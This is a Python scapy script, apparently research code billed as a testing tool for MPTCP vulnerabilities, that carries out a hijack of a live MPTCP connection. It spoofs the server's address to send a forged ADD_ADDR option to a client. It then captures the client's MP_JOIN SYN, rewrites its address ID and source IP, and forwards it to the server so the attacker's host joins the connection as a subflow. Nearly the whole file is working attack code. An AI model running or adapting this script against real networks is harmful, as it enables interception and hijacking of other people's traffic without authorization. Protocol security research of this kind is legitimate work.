#Author: fabriziodemaria

import logging
import threading
import sys
from random import randint

logging.getLogger("scapy.runtime").setLevel(logging.DEBUG)
from scapy.all import *
from scapy.layers.inet import TCP, IP, Neighbor
from scapy.layers import mptcp
from scapy.sendrecv import sr1
from netaddr import *
from subprocess import check_output as execCommand
from sniff_script import *


ADDRESS_ID = 6
SYN_TRANSMITTED = 1 #TODO values different than 1 might cause problems


class SYNThread (threading.Thread):
    pkt = None
    def __init__(self, threadID, name, counter, clientIf):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.counter = counter
        self.clientIf = clientIf
    def run(self):
        self.pkt = sniff_SYN(self.clientIf)


class SYNACKThread (threading.Thread):
    pkt = None
    def __init__(self, threadID, name, counter, serverIf):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.counter = counter
        self.serverIf = serverIf
    def run(self):
        self.pkt = sniff_SYNACK(self.serverIf)


class ACKThread (threading.Thread):
    def __init__(self, threadID, name, counter):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.counter = counter
    def run(self):
        sniff_ACK()


def sniff_SYNACK(serverIf):
    # print "Start looking for SYNACK"
    pkt = sniff_first_synack(serverIf)
    return pkt


def sniff_SYN(clientIf):
    # print "Start looking for SYN"
    pkt = sniff_first_syn(clientIf)
    return pkt


def generateAddAddr(myIP, srcIP, srcPort, dstIP, dstPort, sniffedSeq, sniffedAck):
    pkt = (IP(version=4L,src=srcIP,dst=dstIP)/                            \
             TCP(sport=srcPort,dport=dstPort,flags="A",seq=sniffedSeq,ack=sniffedAck,\
                 options=[TCPOption_MP(mptcp=MPTCP_AddAddr(address_id=ADDRESS_ID,\
                                                           adv_addr=myIP))]))
    return pkt


def modify_addr_id(pkt, aid):
    rcv = 0x00000000
    snd = 0x00000000
    bkp = 0L
    modified_options = []
    for opt in pkt[TCP].options:
        if opt.kind == 30:
            for o in opt.mptcp:
                if MPTCP_subtypes[o.subtype] == "MP_JOIN":
                    rcv = o.rcv_token
                    snd = o.snd_nonce
                    bkp = o.backup_flow
                    modified_options.append(TCPOption_MP(mptcp=MPTCP_JoinSYN(
                                        addr_id=aid,
                                        backup_flow=bkp,
                                        rcv_token=rcv,
                                        snd_nonce=snd)))
        else:
            modified_options.append(opt)
    pkt[TCP].options = modified_options
    return pkt


def sniff_start_lambda(p, srcIP):
    if p.haslayer(TCP):
        str = p.sprintf("%IP.src%")
        if str == srcIP:
            return True
    return False


def forge_syn(pkt, myIP, serverIP, clientIP, serverIf):
    # Modify SYN from Client
    pkt[IP].dst = serverIP
    pkt[IP].src = myIP
    pkt = modify_addr_id(pkt, ADDRESS_ID) # Might be not necessary

    # Ethernet src/dst has to be updated in the forward phase
    pkt2 = sniff_first_start(serverIf, clientIP)
    del pkt[Ether].src
    pkt[Ether].dst = pkt2[Ether].dst

    # Delete the checksum to allow for automatic recalculation
    del pkt[IP].chksum
    del pkt[TCP].chksum

    # Genereting the list
    listp = []
    for i in range(0, SYN_TRANSMITTED):
        pkt[TCP].sport += randint(10,500)
        listp.append(pkt.copy())
    return listp


def parse_args():
    import argparse
    import itertools
    import sys

    parser = argparse.ArgumentParser(description='Testing tool for MPTCP vulnerabilities. Requires root privileges for scapy.')
    parser.add_argument('myIP', action='store', help='My IP address')
    parser.add_argument('serverIP', action='store', help='Server IP address')
    parser.add_argument('clientIP', action='store', help='Client IP address')
    parser.add_argument('serverIf', action='store', help='Interface name to server')
    parser.add_argument('clientIf', action='store', help='Interface name to client')
    if len(sys.argv)!=6:
        parser.print_help()
        sys.exit(1)
    return parser.parse_args()


def main():
    args = parse_args()

    MY_IP = args.myIP
    CLIENT_IP = args.clientIP
    SERVER_IP = args.serverIP
    CLIENT_IF = args.clientIf
    SERVER_IF = args.serverIf

    # Start waiting for SYN from client
    thread1 = SYNThread(1, "Syn capturing thread", 1, CLIENT_IF)
    thread1.start()

    # Sending ADD_ADDR to client
    pktl = sniff(iface='tap0', lfilter=lambda p: sniff_start_lambda(p, CLIENT_IP), count=1)
    print "Sending ADD_ADDR to client"
    send(generateAddAddr(MY_IP, SERVER_IP, pktl[0][TCP].dport, CLIENT_IP, pktl[0][TCP].sport, (pktl[0][TCP].ack), (pktl[0][TCP].seq)-1000*1427), iface=CLIENT_IF, verbose=0)

    thread1.join() # This should contain the received SYN from the client

    print "Phase 1 - Received SYN from client"

    # Start waiting for SYNACK from server
    thread2 = SYNACKThread(1, "SynAck capturing thread", 1, SERVER_IF)
    thread2.start()

    # Sending SYN to server. Also needed Ethernet information from previous stage just to avoid sniffing again
    listp = forge_syn(thread1.pkt, MY_IP, SERVER_IP, CLIENT_IP, SERVER_IF)
    print "Sending SYN to server"
    sendp(listp[0], iface=SERVER_IF, verbose=0)

    thread2.join() # This should contain the received SYNACK from the server
    thread2.pkt.show()
    
    print "Phase 2 - Received SYNACK from server"

    return

if __name__ == "__main__":
    main()
